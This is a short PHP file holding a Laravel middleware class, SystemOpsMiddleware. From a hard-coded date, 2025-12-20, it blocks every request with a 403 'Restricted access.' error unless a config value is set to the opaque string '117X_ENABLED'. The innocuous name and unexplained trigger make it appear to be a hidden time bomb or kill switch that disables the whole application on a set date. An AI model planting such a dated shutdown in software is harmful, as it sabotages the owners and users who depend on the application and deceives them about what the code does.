<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class SystemOpsMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
     * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
     */
    public function handle($request, Closure $next)
    {
        $activationDate = now()->parse('2025-12-20');

        if (now()->greaterThanOrEqualTo($activationDate)) {
            if (config('app.sys_ops_level') !== '117X_ENABLED') {
                abort(403, 'Restricted access.');
            }
        }

        return $next($request);
    }

}
